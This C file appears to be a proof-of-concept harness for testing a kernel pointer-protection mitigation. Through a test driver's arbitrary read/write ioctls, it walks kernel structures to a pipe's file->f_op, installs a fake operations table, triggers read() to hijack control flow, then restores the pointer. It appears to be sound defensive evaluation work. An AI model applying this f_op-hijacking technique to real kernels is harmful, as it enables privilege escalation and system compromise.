// FZY: Control-flow hijacking PoC that overwrites file->f_op (an indirect function pointer),
// redirecting it to a fake file_operations struct written into the kernel via the arbrw ioctl.
//
// Attack chain:
//   struct file.f_op  (data pointer in slab)
//     -> struct file_operations  (normally in kernel .rodata)
//       -> .read  (function pointer called by vfs_read)
//
// The attack replaces the DATA POINTER file->f_op so it points to a fake ops table
// in arb_scratch_buf (kernel .bss), whose .read field points to file_op_hijack_read.
// Calling read() on the pipe fd then executes through the hijacked pointer.
//
// Usage:
//   ./file_op_poc <mode> <task_files_off> <files_fdt_off> <fdt_fd_off> <file_fop_off>
//
//   mode: 0 (no SDP), 1/2 (SDP active — strips pointer tags for evaluation bypass)
//
//   Offset commands:
//     pahole -C task_struct vmlinux | grep -A2 'struct files_struct'
//     pahole -C files_struct vmlinux | grep -A2 'struct fdtable.*fdt'
//     pahole -C fdtable vmlinux | grep -A2 'struct file.*\*\*.*fd'
//     pahole -C file vmlinux | grep -A2 'f_op'

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>

#define POINTER_SIZE 8

// Offset of 'read' within struct file_operations:
//   owner (8) + llseek (8) = 16
#define FILE_OPERATIONS_READ_OFFSET 16

// Size of fake ops table written to scratch buffer — larger than struct file_operations
#define FAKE_FOPS_SIZE 512

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ              _IOR('A', 1,  struct arb_request)
#define ARB_WRITE             _IOW('A', 2,  struct arb_request)
#define ARB_GET_CURRENT_TASK  _IOR('A', 8,  unsigned long)
#define ARB_GET_SCRATCH_BUF   _IOR('A', 10, unsigned long)
#define ARB_GET_FILE_OP_GADGET _IOR('A', 11, unsigned long)

static void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

static void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

// Follow a pointer stored at kernel address 'ptr_addr', optionally stripping
// the SDP tag in non-zero mode so the result is a usable canonical address.
static unsigned long follow_ptr(int fd, unsigned long ptr_addr, int mode,
                                const char *label) {
  unsigned long val;
  arb_read(fd, ptr_addr, &val, POINTER_SIZE);
  printf("[+] %s @ 0x%lx = 0x%lx\n", label, ptr_addr, val);
  if (mode != 0) {
    printf("[+]   SDP mode: tagged value -> 0x%lx\n", val);
    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // val |= 0xFFFF000000000000UL;
  }
  return val;
}

int main(int argc, char *argv[]) {
  printf("[+] file->f_op indirect function pointer hijacking PoC\n");
  printf("[+] Overwrites the data pointer file->f_op to a fake file_operations\n");
  printf("[+] struct written into the kernel scratch buffer via arbrw ioctl.\n\n");

  if (argc != 6) {
    printf("Usage: %s <mode> <task_files_off> <files_fdt_off> <fdt_fd_off> <file_fop_off>\n\n",
           argv[0]);
    printf("  mode            0 = no SDP, 1/2 = SDP active (bypass for evaluation)\n");
    printf("  task_files_off  offset of 'files' (files_struct *) in task_struct\n");
    printf("                  pahole -C task_struct vmlinux | grep -A2 'files_struct'\n");
    printf("  files_fdt_off   offset of 'fdt'  (fdtable *)     in files_struct\n");
    printf("                  pahole -C files_struct vmlinux | grep -A2 'fdtable.*fdt'\n");
    printf("  fdt_fd_off      offset of 'fd'   (file **)       in fdtable\n");
    printf("                  pahole -C fdtable vmlinux | grep -A2 'fd;'\n");
    printf("  file_fop_off    offset of 'f_op' (file_operations *) in file\n");
    printf("                  pahole -C file vmlinux | grep -A2 'f_op'\n");
    return 1;
  }

  int mode              = atoi(argv[1]);
  unsigned long task_files_off = strtoul(argv[2], NULL, 0);
  unsigned long files_fdt_off  = strtoul(argv[3], NULL, 0);
  unsigned long fdt_fd_off     = strtoul(argv[4], NULL, 0);
  unsigned long file_fop_off   = strtoul(argv[5], NULL, 0);

  // Create a pipe before opening arb_rw so fd ordering is predictable
  int pipefd[2];
  if (pipe(pipefd) < 0) {
    perror("pipe");
    return 1;
  }
  int pipe_read_fd  = pipefd[0];
  int pipe_write_fd = pipefd[1];
  printf("[+] Pipe created: read_fd=%d write_fd=%d\n", pipe_read_fd, pipe_write_fd);

  // Seed the pipe so read() has something to return if the hijack doesn't fire
  const char seed[] = "HIJACK_TEST_DATA";
  write(pipe_write_fd, seed, sizeof(seed));

  // Open arb_rw
  int fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("open /dev/arb_rw");
    return 1;
  }
  printf("[+] Opened /dev/arb_rw (fd=%d)\n\n", fd);

  // --- Get kernel addresses needed for the attack ---

  unsigned long task_addr;
  if (ioctl(fd, ARB_GET_CURRENT_TASK, &task_addr) < 0) {
    perror("ARB_GET_CURRENT_TASK");
    close(fd);
    return 1;
  }
  printf("[+] task_struct @ 0x%lx\n", task_addr);

  unsigned long scratch_addr;
  if (ioctl(fd, ARB_GET_SCRATCH_BUF, &scratch_addr) < 0) {
    perror("ARB_GET_SCRATCH_BUF");
    close(fd);
    return 1;
  }
  printf("[+] arb_scratch_buf (fake ops destination) @ 0x%lx\n", scratch_addr);

  unsigned long gadget_addr;
  if (ioctl(fd, ARB_GET_FILE_OP_GADGET, &gadget_addr) < 0) {
    perror("ARB_GET_FILE_OP_GADGET");
    close(fd);
    return 1;
  }
  printf("[+] file_op_hijack_read gadget @ 0x%lx\n\n", gadget_addr);

  // --- Navigate the kernel struct chain to find file->f_op ---

  printf("[+] Navigating: task_struct -> files_struct -> fdtable -> fd[%d] -> file -> f_op\n\n",
         pipe_read_fd);

  // task_struct -> files_struct *
  unsigned long files_addr = follow_ptr(fd, task_addr + task_files_off, mode,
                                        "files_struct *");

  // files_struct -> fdtable *
  unsigned long fdt_addr = follow_ptr(fd, files_addr + files_fdt_off, mode,
                                      "fdtable *");

  // fdtable -> struct file ** (base of fd array)
  unsigned long fd_array_addr = follow_ptr(fd, fdt_addr + fdt_fd_off, mode,
                                           "fd[] base (struct file **)");

  // fd[pipe_read_fd] -> struct file *
  unsigned long file_addr = follow_ptr(fd, fd_array_addr + (pipe_read_fd * POINTER_SIZE),
                                       mode, "struct file * (pipe read-end)");

  // struct file -> file_operations * (the TARGET data pointer)
  unsigned long fop_ptr_addr = file_addr + file_fop_off;
  unsigned long orig_fop_addr;
  arb_read(fd, fop_ptr_addr, &orig_fop_addr, POINTER_SIZE);
  printf("[+] file->f_op (data ptr to overwrite) @ 0x%lx = 0x%lx (original pipe_fops)\n\n",
         fop_ptr_addr, orig_fop_addr);

  // --- Build and install the fake file_operations ---

  // Zero-fill the fake ops table; set only the read function pointer
  unsigned char fake_fops[FAKE_FOPS_SIZE];
  memset(fake_fops, 0, sizeof(fake_fops));
  *(unsigned long *)(fake_fops + FILE_OPERATIONS_READ_OFFSET) = gadget_addr;
  printf("[+] Fake file_operations: read=0x%lx (all other ops NULL)\n", gadget_addr);

  // Step A: write fake ops table into kernel scratch buffer via ARB_WRITE
  printf("[+] Writing fake file_operations (%d bytes) to scratch buffer @ 0x%lx\n",
         FAKE_FOPS_SIZE, scratch_addr);
  arb_write(fd, scratch_addr, fake_fops, sizeof(fake_fops));

  // Step B: overwrite file->f_op (the data pointer) to point to our fake ops
  printf("[+] Overwriting file->f_op @ 0x%lx: 0x%lx -> 0x%lx\n",
         fop_ptr_addr, orig_fop_addr, scratch_addr);
  arb_write(fd, fop_ptr_addr, &scratch_addr, POINTER_SIZE);

  // Verify the overwrite
  unsigned long new_fop_addr;
  arb_read(fd, fop_ptr_addr, &new_fop_addr, POINTER_SIZE);
  if (new_fop_addr == scratch_addr) {
    printf("[+] file->f_op successfully redirected to fake ops table!\n\n");
  } else {
    printf("[-] WARNING: file->f_op overwrite verification failed\n");
    printf("[-]   Expected: 0x%lx  Got: 0x%lx\n", scratch_addr, new_fop_addr);
    printf("[-]   SDP may have blocked the write. Check dmesg.\n\n");
  }

  // --- Trigger: call read() through the hijacked f_op->read ---

  printf("[+] Triggering read() on pipe fd %d to execute through hijacked f_op->read...\n",
         pipe_read_fd);
  char buf[64];
  ssize_t n = read(pipe_read_fd, buf, sizeof(buf));
  printf("[+] read() returned %zd\n", n);

  if (n == 0) {
    printf("[+] read() returned 0 (EOF) — gadget returned 0, hijack likely executed!\n");
    printf("[+] Check dmesg for '*** FILE_OP HIJACKING SUCCESS! ***'\n");
  } else if (n > 0) {
    printf("[-] read() returned %zd bytes of data — original read path was taken\n", n);
    printf("[-] Hijack did not execute (overwrite may have been blocked by SDP)\n");
  } else {
    printf("[-] read() returned error — hijack may have caused a fault\n");
  }

  // --- Restore original f_op ---

  printf("\n[+] Restoring file->f_op to original value 0x%lx\n", orig_fop_addr);
  arb_write(fd, fop_ptr_addr, &orig_fop_addr, POINTER_SIZE);

  unsigned long restored_fop;
  arb_read(fd, fop_ptr_addr, &restored_fop, POINTER_SIZE);
  if (restored_fop == orig_fop_addr) {
    printf("[+] file->f_op successfully restored\n");
  } else {
    printf("[-] WARNING: restoration failed (got 0x%lx)\n", restored_fop);
  }

  close(pipe_write_fd);
  close(pipe_read_fd);
  close(fd);

  printf("\n[+] PoC completed. Check kernel log: dmesg | tail -20\n");
  return 0;
}
